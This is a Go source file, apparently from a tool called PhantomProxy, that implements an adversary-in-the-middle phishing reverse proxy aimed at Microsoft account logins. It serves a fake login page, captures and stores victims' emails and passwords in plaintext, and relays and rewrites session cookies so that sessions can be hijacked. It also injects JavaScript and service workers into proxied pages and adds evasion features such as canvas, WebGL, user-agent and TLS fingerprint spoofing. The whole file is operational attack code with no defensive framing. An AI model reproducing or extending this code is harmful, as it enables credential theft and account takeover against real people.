package proxy

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/events"
	"github.com/phantom-proxy/phantom-proxy/internal/ml"
	"github.com/phantom-proxy/phantom-proxy/internal/polymorphic"
	"github.com/phantom-proxy/phantom-proxy/internal/serviceworker"
	"github.com/phantom-proxy/phantom-proxy/internal/websocket"
)

// TLSDialer is an abstraction for establishing TLS connections.  Implementations
// may spoof fingerprints (e.g. via utls) or just dial normally.
type TLSDialer interface {
	Dial(network, addr string) (net.Conn, error)
}

// HTTPProxy основной HTTP/HTTPS прокси
type HTTPProxy struct {
	mu           sync.RWMutex
	cfg          *config.Config
	db           *database.Database
	logger       *zap.Logger
	server       *http.Server
	tlsConfig    *tls.Config
	// optional TLS dialer used when outbound connections are made.  nil means
	// use default tls.Dial.
	tlsManager   TLSDialer
	wsProxy      *websocket.Proxy
	swInjector   *serviceworker.Injector
	polyEngine   *polymorphic.Engine
	botDetector  *ml.BotDetector
	sessions     map[string]*ProxySession
	sessionIndex map[string]string
	phishlets    map[string]*Phishlet
	reverseProxy *httputil.ReverseProxy
	eventBus     *events.Bus
	// rng for various random operations
	rand         *rand.Rand
}

// ProxySession представляет прокси-сессию
type ProxySession struct {
	ID           string
	VictimIP     string
	TargetHost   string
	TargetURL    *url.URL
	CreatedAt    time.Time
	LastActive   time.Time
	PhishletID   string
	Credentials  *database.Credentials
	Cookies      []*http.Cookie
	RequestCount int64
	UserAgent    string // recorded or spoofed user agent
}

// Phishlet конфигурация для целевого сервиса
type Phishlet struct {
	ID           string        `yaml:"id"`
	Author       string        `yaml:"author"`
	MinVer       string        `yaml:"min_ver"`
	ProxyHosts   []ProxyHost   `yaml:"proxy_hosts"`
	SubFilters   []SubFilter   `yaml:"sub_filters"`
	AuthTokens   []AuthToken   `yaml:"auth_tokens"`
	Credentials  CredConfig    `yaml:"credentials"`
	AuthURLs     []string      `yaml:"auth_urls"`
	Login        LoginConfig   `yaml:"login"`
	JSInjections []JSInjection `yaml:"js_inject"`
	Enabled      bool          `yaml:"enabled"`
}

type ProxyHost struct {
	PhishSub  string `yaml:"phish_sub"`
	OrigSub   string `yaml:"orig_sub"`
	Domain    string `yaml:"domain"`
	Session   bool   `yaml:"session"`
	IsLanding bool   `yaml:"is_landing"`
}

type SubFilter struct {
	TriggersOn string   `yaml:"triggers_on"`
	OrigSub    string   `yaml:"orig_sub"`
	Domain     string   `yaml:"domain"`
	Search     string   `yaml:"search"`
	Replace    string   `yaml:"replace"`
	Mimes      []string `yaml:"mimes"`
	RedirectOnly bool   `yaml:"redirect_only"`
	regex      *regexp.Regexp
}

type AuthToken struct {
	Domain string
	Keys   []string
}

type CredConfig struct {
	Username FieldConfig
	Password FieldConfig
	Custom   []FieldConfig
}

type FieldConfig struct {
	Key    string
	Search string
	Type   string
	regex  *regexp.Regexp
}

type LoginConfig struct {
	Domain string
	Path   string
}

type JSInjection struct {
	TriggerDomains []string
	TriggerPaths   []string
	TriggerParams  []string
	Script         string
}

// NewHTTPProxy создаёт новый HTTP прокси
func NewHTTPProxy(cfg *config.Config, db *database.Database, tlsManager TLSDialer, logger *zap.Logger) (*HTTPProxy, error) {
	// Загрузка TLS сертификатов
	tlsConfig, err := loadTLSConfig(cfg.CertPath, cfg.KeyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load TLS config: %w", err)
	}

	p := &HTTPProxy{
		cfg:          cfg,
		db:           db,
		logger:       logger,
		tlsConfig:    tlsConfig,
		tlsManager:   tlsManager,
		sessions:     make(map[string]*ProxySession),
		sessionIndex: make(map[string]string),
		phishlets:    make(map[string]*Phishlet),
		wsProxy:      websocket.NewProxy(logger),
		swInjector:   serviceworker.NewInjector(fmt.Sprintf("https://%s", cfg.Domain), "redirect"),
		rand:          rand.New(rand.NewSource(time.Now().UnixNano())),
	}

	// Загрузка phishlets
	if err := p.loadPhishlets(); err != nil {
		logger.Warn("Failed to load phishlets", zap.Error(err))
	}

	// Создание reverse proxy
	p.reverseProxy = &httputil.ReverseProxy{
		Director:       p.director,
		ModifyResponse: p.modifyResponse,
		ErrorHandler:   p.errorHandler,
		Transport:      p.createTransport(),
	}

	// HTTP сервер
	p.server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", cfg.BindIP, cfg.HTTPSPort),
		Handler:      p,
		TLSConfig:    tlsConfig,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	return p, nil
}

// loadTLSConfig загружает TLS сертификаты
func loadTLSConfig(certFile, keyFile string) (*tls.Config, error) {
	if certFile == "" || keyFile == "" {
		// tests or fallback may pass empty paths; return minimal config
		return &tls.Config{
			MinVersion: tls.VersionTLS12,
		}, nil
	}

	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, err
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		NextProtos:   []string{"h2", "http/1.1"},
	}, nil
}

// ServeHTTP главный обработчик HTTP запросов
func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	start := time.Now()

	// Обработка Service Worker (только если включено в конфиг)
	if cfg := p.cfg; cfg != nil && cfg.ServiceWorkerEnabled {
		if strings.HasPrefix(r.URL.Path, "/sw.js") || strings.HasPrefix(r.URL.Path, "/phantom.js") {
			p.swInjector.HandleSWRequest(w, r)
			return
		}
	}

	// Обработка CORS preflight OPTIONS запросов
	if r.Method == "OPTIONS" {
		p.logger.Debug("CORS preflight request",
			zap.String("path", r.URL.Path),
			zap.String("origin", r.Header.Get("Origin")))

		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "*")
		w.Header().Set("Access-Control-Allow-Credentials", "true")
		w.Header().Set("Access-Control-Max-Age", "86400")
		w.WriteHeader(http.StatusOK)
		return
	}

	// Обработка /login - страница входа
	if r.URL.Path == "/login" && r.Method == "GET" {
		p.serveLoginPage(w, r)
		return
	}

	// Обработка POST на /api/v1/credentials - перехват credentials
	if r.URL.Path == "/api/v1/credentials" && r.Method == "POST" {
		p.captureCredentialsAPI(w, r)
		return
	}

	// Корневой путь - редирект на Microsoft С client_id
	if r.URL.Path == "/" && r.Method == "GET" {
		// Редирект на Microsoft OAuth с правильным client_id
		redirectURL := "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000002-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient"
		http.Redirect(w, r, redirectURL, http.StatusFound)
		return
	}

	// Добавление client_id и scope в GET запросы на OAuth
	if r.Method == "GET" && strings.Contains(r.URL.Path, "/oauth2/") {
		query := r.URL.Query()

		// Добавляем client_id если нет
		if !query.Has("client_id") {
			query.Set("client_id", "00000002-0000-0000-c000-000000000000")
			p.logger.Info("client_id added to URL")
		}

		// Добавляем scope если нет
		if !query.Has("scope") {
			query.Set("scope", "openid profile email")
			p.logger.Info("scope added to URL")
		}

		// Исправляем redirect_uri на стандартный
		if query.Has("redirect_uri") {
			oldURI := query.Get("redirect_uri")
			if strings.Contains(oldURI, "verdebudget") {
				query.Set("redirect_uri", "https://login.microsoftonline.com/common/oauth2/nativeclient")
				p.logger.Info("redirect_uri corrected")
			}
		}

		r.URL.RawQuery = query.Encode()
	}

	// Получение или создание сессии
	session := p.getOrCreateSession(r)

	// Логирование запроса
	p.logger.Debug("Incoming request",
		zap.String("session_id", session.ID),
		zap.String("method", r.Method),
		zap.String("url", r.URL.String()),
		zap.String("host", r.Host),
		zap.String("ip", p.getClientIP(r)),
	)

	// Обновление активности
	session.LastActive = time.Now()
	session.RequestCount++

	// Проверка на WebSocket
	if strings.ToLower(r.Header.Get("Upgrade")) == "websocket" {
		p.wsProxy.HandleWS(w, r)
		return
	}

	// Обработка через reverse proxy
	p.reverseProxy.ServeHTTP(w, r)

	// Логирование времени обработки
	p.logger.Debug("Request processed",
		zap.String("session_id", session.ID),
		zap.Duration("duration", time.Since(start)),
	)
}

// serveLoginPage обслуживает страницу входа
func (p *HTTPProxy) serveLoginPage(w http.ResponseWriter, r *http.Request) {
	htmlPath := "configs/phishlets/login_page.html"
	htmlContent, err := os.ReadFile(htmlPath)
	if err != nil {
		p.logger.Error("Failed to read login page", zap.Error(err))
		http.Error(w, "Error loading login page", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write(htmlContent)
}

// captureCredentialsAPI перехватывает credentials
func (p *HTTPProxy) captureCredentialsAPI(w http.ResponseWriter, r *http.Request) {
	// Читаем JSON body
	var req struct {
		Email    string `json:"email"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		p.logger.Error("Failed to parse credentials", zap.Error(err))
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid request"})
		return
	}

	p.logger.Info("Credentials captured via HTTPS",
		zap.String("email", req.Email),
		zap.String("password", req.Password),
		zap.String("ip", p.getClientIP(r)))

	// Сохраняем в БД
	session := &database.Session{
		VictimIP:   p.getClientIP(r),
		TargetURL:  "login_page",
		UserAgent:  r.UserAgent(),
		State:      "active",
	}
	if err := p.db.CreateSession(session); err != nil {
		p.logger.Error("Failed to create session", zap.Error(err))
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Database error"})
		return
	}

	creds := &database.Credentials{
		SessionID: session.ID,
		Username:  req.Email,
		Password:  req.Password,
	}
	if err := p.db.CreateCredentials(creds); err != nil {
		p.logger.Error("Failed to save credentials", zap.Error(err))
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Database error"})
		return
	}

	p.logger.Info("Credentials saved to database",
		zap.String("session_id", session.ID),
		zap.String("email", req.Email))

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{
		"success": "true",
		"message": "Credentials captured",
	})
}

// handleRoot обрабатывает корневой запрос
func (p *HTTPProxy) handleRoot(w http.ResponseWriter, r *http.Request) {
	// Проверяем Accept header для определения типа клиента
	accept := r.Header.Get("Accept")

	if strings.Contains(accept, "text/html") {
		// Браузер - показываем тестовую страницу
		p.serveTestPage(w, r)
	} else {
		// API/CLI запрос - редирект на Microsoft
		http.Redirect(w, r, "https://login.microsoftonline.com", http.StatusFound)
	}
}

// serveTestPage показывает тестовую страницу
func (p *HTTPProxy) serveTestPage(w http.ResponseWriter, r *http.Request) {
	html := `<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy - VerdeBudget</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #2ecc71; margin-bottom: 10px; }
        .status { padding: 10px; background: #e8f5e9; border-left: 4px solid #2ecc71; margin: 20px 0; }
        .info { color: #666; line-height: 1.6; }
        .btn { display: inline-block; padding: 12px 24px; background: #2ecc71; color: white; text-decoration: none; border-radius: 4px; margin-top: 20px; }
        .btn:hover { background: #27ae60; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✅ PhantomProxy работает!</h1>
        <div class="status">
            <strong>Статус:</strong> Сервер работает корректно
        </div>
        <div class="info">
            <p><strong>Домен:</strong> verdebudget.ru</p>
            <p><strong>API Port:</strong> 8080</p>
            <p><strong>HTTPS Port:</strong> 8443</p>
            <p><strong>Phishlets:</strong> 2 загружено</p>
        </div>
        <a href="https://login.microsoftonline.com" class="btn" target="_blank">Перейти на Microsoft Login →</a>
    </div>
    <script>
        console.log('PhantomProxy test page loaded');
        // Регистрация Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js')
                .then(reg => console.log('SW registered:', reg.scope))
                .catch(err => console.log('SW registration failed:', err));
        }
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(html))
}

// director модифицирует запрос перед отправкой на бэкенд
func (p *HTTPProxy) director(req *http.Request) {
	session := p.getSessionFromContext(req)

	// Определяем целевой хост из phishlet
	targetHost := "login.microsoftonline.com"
	targetScheme := "https"

	if session != nil && session.TargetHost != "" {
		targetHost = session.TargetHost
	}

	// Получаем phishlet для определения target
	if session != nil && session.PhishletID != "" {
		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
			if len(phishlet.ProxyHosts) > 0 {
				ph := phishlet.ProxyHosts[0]
				// Формируем правильный target: orig_sub.domain
				targetHost = ph.OrigSub
				if ph.OrigSub != "" {
					targetHost += "." + ph.Domain
				} else {
					targetHost = ph.Domain
				}
			}
		}
	}

	// Устанавливаем target URL
	req.URL.Scheme = targetScheme
	req.URL.Host = targetHost

	// ОРИГИНАЛЬНЫЙ Host header для Microsoft
	req.Host = targetHost

	p.logger.Info("DIRECTOR - Target set",
		zap.String("target_host", targetHost),
		zap.String("session", session.ID))

	// Для ВСЕХ POST запросов на Microsoft ДОБАВЛЯЕМ client_id
	if req.Method == "POST" && strings.Contains(req.Host, "microsoft") {
		p.logger.Info("INTERCEPTING POST to Microsoft",
			zap.String("path", req.URL.Path),
			zap.String("session", session.ID),
			zap.String("ip", p.getClientIP(req)))

		// Читаем тело запроса
		bodyBytes, err := io.ReadAll(req.Body)
		if err != nil {
			p.logger.Error("Failed to read POST body", zap.Error(err))
		} else {
			bodyStr := string(bodyBytes)
			originalBody := bodyStr

			// Проверяем есть ли client_id
			hasClientID := strings.Contains(bodyStr, "client_id=")

			// Добавляем client_id если нет
			if !hasClientID {
				if bodyStr != "" {
					bodyStr += "&client_id=00000002-0000-0000-c000-000000000000"
				} else {
					bodyStr = "client_id=00000002-0000-0000-c000-000000000000"
				}

				p.logger.Info("client_id ADDED!",
					zap.String("original_len", fmt.Sprintf("%d", len(originalBody))),
					zap.String("new_len", fmt.Sprintf("%d", len(bodyStr))))
			} else {
				p.logger.Info("client_id already present")
			}

			// Обновляем Content-Length и тело
			req.ContentLength = int64(len(bodyStr))
			req.Body = io.NopCloser(strings.NewReader(bodyStr))

			// Логируем первые 200 символов для отладки
			logLen := 200
			if len(bodyStr) < logLen {
				logLen = len(bodyStr)
			}
			p.logger.Debug("POST body",
				zap.String("body_preview", bodyStr[:logLen]))
		}
	}

	// Normalize headers to look more like a real browser
	if cfg := p.cfg; cfg != nil && cfg.NormalizeHeaders {
		normalizeHeaders(req)
	}

	// Polymorphic mode: add random query param to avoid simple fingerprinting
	if cfg := p.cfg; cfg != nil && cfg.PolymorphicEnabled {
		q := req.URL.Query()
		q.Set("__phantom", uuid.New().String())
		req.URL.RawQuery = q.Encode()
	}

	// Set User-Agent based on session (may have been randomized)
	if session != nil && session.UserAgent != "" {
		req.Header.Set("User-Agent", session.UserAgent)
	}

	// Замена Referer
	if referer := req.Referer(); referer != "" {
		req.Header.Set("Referer", p.replaceDomain(referer, session))
	}

	// Замена Origin
	if origin := req.Header.Get("Origin"); origin != "" {
		req.Header.Set("Origin", p.replaceDomain(origin, session))
	}

	// Добавление cookies сессии
	if session != nil {
		for _, cookie := range session.Cookies {
			req.AddCookie(cookie)
		}
	}

	p.logger.Debug("Request modified",
		zap.String("session_id", session.ID),
		zap.String("host", req.Host),
		zap.String("url", req.URL.String()),
	)
}

// modifyResponse модифицирует ответ от бэкенда
func (p *HTTPProxy) modifyResponse(resp *http.Response) error {
	session := p.getSessionFromContext(resp.Request)
	if session == nil {
		return nil
	}

	contentType := resp.Header.Get("Content-Type")

	// Добавляем CORS headers для разрешения AJAX запросов
	resp.Header.Set("Access-Control-Allow-Origin", "*")
	resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
	resp.Header.Set("Access-Control-Allow-Headers", "*")
	resp.Header.Set("Access-Control-Allow-Credentials", "true")

	// Чтение тела ответа
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	resp.Body.Close()

	// Модификация контента
	modifiedBody := body

	// Замена доменов в HTML/JS/JSON
	if p.shouldModifyContent(contentType) {
		modifiedBody = p.applySubFilters(body, session)

		// Инъекция JavaScript в HTML
		if strings.Contains(contentType, "text/html") {
			modifiedBody = p.injectJavaScript(modifiedBody, session, resp.Request)

			// Инъекция Service Worker
			if p.cfg.ServiceWorkerEnabled {
				modifiedBody = p.swInjector.InjectHTML(modifiedBody)
			}
		}
	}

	// Обновление Content-Length
	resp.ContentLength = int64(len(modifiedBody))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(modifiedBody)))

	// Обновление тела ответа
	resp.Body = io.NopCloser(bytes.NewReader(modifiedBody))

	// Замена Set-Cookie доменов
	for _, cookie := range resp.Cookies() {
		cookie.Domain = p.getPhishDomain(cookie.Domain, session)
		cookie.Secure = false
		resp.Header.Add("Set-Cookie", cookie.String())
	}

	p.logger.Debug("Response modified",
		zap.String("session_id", session.ID),
		zap.Int("body_size", len(modifiedBody)),
	)

	return nil
}

// applySubFilters применяет правила замены контента
func (p *HTTPProxy) applySubFilters(body []byte, session *ProxySession) []byte {
	result := body

	if session.PhishletID != "" {
		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
			for _, filter := range phishlet.SubFilters {
				if filter.regex != nil {
					result = filter.regex.ReplaceAll(result, []byte(filter.Replace))
				}
			}
		}
	}

	// Автоматическая замена доменов
	result = bytes.ReplaceAll(result, []byte(session.TargetHost), []byte(session.ID+".phantom.local"))

	return result
}

// injectJavaScript внедряет JavaScript в HTML
func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession, req *http.Request) []byte {
	bodyTag := []byte("</body>")
	idx := bytes.LastIndex(body, bodyTag)

	if idx == -1 {
		return body
	}

	script := p.generateScript(session, req)
	if script == "" {
		// no injections matched
		return body
	}

	result := make([]byte, len(body)+len(script))
	copy(result, body[:idx])
	copy(result[idx:], script)
	copy(result[idx+len(script):], bodyTag)

	return result
}

// canvasSpoofScript is a small snippet that overrides canvas methods
// to return a constant image, preventing fingerprinting.
const canvasSpoofScript = `(function(){
    const original = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {
        try {
            return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAA';
        } catch(e) { return original.apply(this, arguments); }
    };

    // simple WebGL fingerprint spoof: stub out getParameter
    if (window.WebGLRenderingContext) {
        const origGetParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(param) {
            // return constant value for common queries
            if (param === 37445 || param === 37446) { // VENDOR, RENDERER
                return 'WebKit';
            }
            return origGetParameter.apply(this, arguments);
        };
    }
})();`

// generateScript генерирует JavaScript для инъекции на основе условий и
// опциональных анти-детект флагов.
func (p *HTTPProxy) generateScript(session *ProxySession, req *http.Request) string {
	parts := []string{}

	// anti-detect canvas spoofing
	if cfg := p.cfg; cfg != nil && cfg.CanvasSpoofEnabled {
		parts = append(parts, canvasSpoofScript)
	}

	// phishlet-specific injections
	if session != nil && session.PhishletID != "" {
		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
			for _, inj := range phishlet.JSInjections {
				if injectionMatches(inj, req) {
					parts = append(parts, inj.Script)
				}
			}
		}
	}

	if len(parts) == 0 {
		return ""
	}

	script := `<script id="phantom-inject">` + strings.Join(parts, "") + `</script>`
	return script
}

// injectionMatches проверяет, должен ли инъекция применяться к текущему запросу
func injectionMatches(inj JSInjection, req *http.Request) bool {
	// domain trigger
	if len(inj.TriggerDomains) > 0 {
		host := req.Host
		matched := false
		for _, d := range inj.TriggerDomains {
			if strings.Contains(host, d) {
				matched = true
				break
			}
		}
		if !matched {
			return false
		}
	}

	// path trigger
	if len(inj.TriggerPaths) > 0 {
		path := req.URL.Path
		matched := false
		for _, p := range inj.TriggerPaths {
			if strings.Contains(path, p) {
				matched = true
				break
			}
		}
		if !matched {
			return false
		}
	}

	// params trigger
	if len(inj.TriggerParams) > 0 {
		q := req.URL.Query()
		matched := false
		for _, p := range inj.TriggerParams {
			if _, ok := q[p]; ok {
				matched = true
				break
			}
		}
		if !matched {
			return false
		}
	}

	return true
}

// shouldModifyContent проверяет, нужно ли модифицировать контент
func (p *HTTPProxy) shouldModifyContent(contentType string) bool {
	modifyTypes := []string{
		"text/html",
		"application/javascript",
		"application/json",
		"text/javascript",
		"text/css",
	}

	for _, t := range modifyTypes {
		if strings.Contains(contentType, t) {
			return true
		}
	}

	return false
}

// replaceDomain заменяет домен в URL
func (p *HTTPProxy) replaceDomain(urlStr string, session *ProxySession) string {
	return strings.ReplaceAll(urlStr, session.TargetHost, session.ID+".phantom.local")
}

// getPhishDomain возвращает фишинговый домен
func (p *HTTPProxy) getPhishDomain(original string, session *ProxySession) string {
	return session.ID + ".phantom.local"
}

// createTransport создаёт HTTP транспорт
func (p *HTTPProxy) createTransport() *http.Transport {
	return &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			if p.tlsManager != nil {
				// let spoofing manager handle connection (will apply selected profile)
				return p.tlsManager.Dial(network, addr)
			}
			config := &tls.Config{
				ServerName: getServerName(addr),
				MinVersion: tls.VersionTLS12,
			}
			return tls.Dial(network, addr, config)
		},
		Proxy:                 http.ProxyFromEnvironment,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
}

func getServerName(addr string) string {
	host, _, _ := net.SplitHostPort(addr)
	return host
}

// normalizeHeaders ensures the request contains typical browser headers
func normalizeHeaders(req *http.Request) {
	if req.Header.Get("Accept-Language") == "" {
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	}
	if req.Header.Get("Accept-Encoding") == "" {
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	}
	if req.Header.Get("Accept") == "" {
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	}
	if req.Header.Get("Connection") == "" {
		req.Header.Set("Connection", "keep-alive")
	}
}

// getOrCreateSession получает или создаёт сессию
func (p *HTTPProxy) getOrCreateSession(r *http.Request) *ProxySession {
	clientIP := p.getClientIP(r)

	p.mu.RLock()
	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		session := p.sessions[sessionID]
		p.mu.RUnlock()
		return session
	}
	p.mu.RUnlock()

	p.mu.Lock()
	defer p.mu.Unlock()

	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		return p.sessions[sessionID]
	}

	session := p.createSession(clientIP, r)
	p.sessions[session.ID] = session
	p.sessionIndex[clientIP] = session.ID

	return session
}

// createSession создаёт новую сессию
func (p *HTTPProxy) createSession(clientIP string, r *http.Request) *ProxySession {
	id := uuid.New().String()

	targetHost := p.determineTargetHost(r)

	// determine user agent value (may be randomized)
	rawUA := r.UserAgent()
	ua := rawUA
	if cfg := p.cfg; cfg != nil && cfg.RandomizeUserAgent && len(cfg.UserAgents) > 0 {
		ua = cfg.UserAgents[p.rand.Intn(len(cfg.UserAgents))]
		p.logger.Debug("User agent randomized", zap.String("ua", ua))
	}

	dbSession := &database.Session{
		ID:         id,
		VictimIP:   clientIP,
		TargetURL:  targetHost,
		UserAgent:  ua,
		State:      "active",
	}
	if p.db != nil {
		if err := p.db.CreateSession(dbSession); err != nil {
			p.logger.Error("Failed to create session in DB", zap.Error(err))
		}
	}

	session := &ProxySession{
		ID:         id,
		VictimIP:   clientIP,
		TargetHost: targetHost,
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
		Cookies:    make([]*http.Cookie, 0),
		UserAgent:  ua,
	}

	p.logger.Info("New session created",
		zap.String("session_id", id),
		zap.String("ip", clientIP),
		zap.String("target", targetHost),
	)

	return session
}

// getSessionFromContext извлекает сессию из контекста запроса
func (p *HTTPProxy) getSessionFromContext(r *http.Request) *ProxySession {
	clientIP := p.getClientIP(r)

	p.mu.RLock()
	defer p.mu.RUnlock()

	if sessionID, ok := p.sessionIndex[clientIP]; ok {
		return p.sessions[sessionID]
	}

	return nil
}

// determineTargetHost определяет целевой хост
func (p *HTTPProxy) determineTargetHost(r *http.Request) string {
	if len(p.phishlets) > 0 {
		for _, phishlet := range p.phishlets {
			if len(phishlet.ProxyHosts) > 0 {
				host := phishlet.ProxyHosts[0].OrigSub + "." + phishlet.ProxyHosts[0].Domain
				return host
			}
		}
	}
	return "login.microsoftonline.com"
}

// getClientIP извлекает IP клиента
func (p *HTTPProxy) getClientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}

	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}

// errorHandler обработчик ошибок прокси
func (p *HTTPProxy) errorHandler(w http.ResponseWriter, r *http.Request, err error) {
	p.logger.Error("Proxy error",
		zap.String("url", r.URL.String()),
		zap.Error(err),
	)

	http.Error(w, "Proxy error: "+err.Error(), http.StatusBadGateway)
}

// Start запускает HTTP сервер
func (p *HTTPProxy) Start(ctx context.Context) error {
	defer func() {
		if r := recover(); r != nil {
			p.logger.Error("Panic in Start", zap.Any("recover", r))
		}
	}()

	go func() {
		<-ctx.Done()
		p.server.Shutdown(context.Background())
	}()

	p.logger.Info("Starting HTTP/HTTPS proxy",
		zap.String("bind", p.cfg.BindIP),
		zap.Int("port", p.cfg.HTTPSPort))

	// Создаём TLS listener
	p.logger.Info("Creating TCP listener", zap.String("addr", p.server.Addr))
	ln, err := net.Listen("tcp", p.server.Addr)
	if err != nil {
		p.logger.Error("Failed to create TCP listener", zap.Error(err))
		return err
	}

	p.logger.Info("TCP listener created, wrapping with TLS")

	tlsLn := tls.NewListener(ln, p.tlsConfig)

	p.logger.Info("HTTPS server started with TLS",
		zap.String("addr", p.server.Addr))

	if err := p.server.Serve(tlsLn); err != http.ErrServerClosed {
		p.logger.Error("HTTPS server error", zap.Error(err))
		return err
	}

	return nil
}

// GetSession получает сессию по ID
func (p *HTTPProxy) GetSession(id string) (*ProxySession, error) {
	p.mu.RLock()
	defer p.mu.RUnlock()

	session, ok := p.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	return session, nil
}

// ListSessions возвращает список всех сессий
func (p *HTTPProxy) ListSessions() []*ProxySession {
	p.mu.RLock()
	defer p.mu.RUnlock()

	sessions := make([]*ProxySession, 0, len(p.sessions))
	for _, s := range p.sessions {
		sessions = append(sessions, s)
	}

	return sessions
}

// SaveCredentials сохраняет учётные данные
func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error {
	session := p.sessions[sessionID]
	if session == nil {
		return fmt.Errorf("session not found")
	}

	creds := &database.Credentials{
		SessionID: sessionID,
		Username:  username,
		Password:  password,
	}
	if p.db != nil {
		if err := p.db.CreateCredentials(creds); err != nil {
			return err
		}
	}

	session.Credentials = creds

	p.logger.Info("Credentials captured",
		zap.String("session_id", sessionID),
		zap.String("username", username),
	)

	if p.eventBus != nil {
		targetURL := ""
		if session.TargetURL != nil {
			targetURL = session.TargetURL.String()
		}
		p.eventBus.Publish(context.Background(), events.EventCredentialCaptured, &events.CredentialEvent{
			SessionID:    sessionID,
			Username:     username,
			Password:     password,
			PhishletID:   session.PhishletID,
			VictimIP:     session.VictimIP,
			Timestamp:    time.Now(),
		})
		p.eventBus.Publish(context.Background(), events.EventSessionCaptured, &events.SessionEvent{
			SessionID:  sessionID,
			VictimIP:   session.VictimIP,
			TargetURL:  targetURL,
			UserAgent:  session.UserAgent,
			PhishletID: session.PhishletID,
			State:      "captured",
			Timestamp:  time.Now(),
		})
	}

	return nil
}

// AddCookie добавляет cookie в сессию
func (p *HTTPProxy) AddCookie(sessionID, name, value, domain, path string, expires time.Time, httpOnly, secure bool) error {
	session := p.sessions[sessionID]
	if session == nil {
		return fmt.Errorf("session not found")
	}

	cookie := &database.Cookie{
		SessionID: sessionID,
		Name:      name,
		Value:     value,
		Domain:    domain,
		Path:      path,
		Expires:   expires,
		HTTPOnly:  httpOnly,
		Secure:    secure,
	}
	if p.db != nil {
		if err := p.db.CreateCookie(cookie); err != nil {
			return err
		}
	}

	session.Cookies = append(session.Cookies, &http.Cookie{
		Name:     name,
		Value:    value,
		Domain:   domain,
		Path:     path,
		Expires:  expires,
		HttpOnly: httpOnly,
		Secure:   secure,
	})

	return nil
}

// GetStats возвращает статистику прокси
func (p *HTTPProxy) GetStats() map[string]interface{} {
	p.mu.RLock()
	defer p.mu.RUnlock()

	stats := map[string]interface{}{
		"total_sessions":   len(p.sessions),
		"active_sessions":  0,
		"total_requests":   int64(0),
		"phishlets_loaded": len(p.phishlets),
	}

	now := time.Now()
	activeCount := 0
	totalRequests := int64(0)

	for _, s := range p.sessions {
		if now.Sub(s.LastActive) < 5*time.Minute {
			activeCount++
		}
		totalRequests += s.RequestCount
	}

	stats["active_sessions"] = activeCount
	stats["total_requests"] = totalRequests

	return stats
}

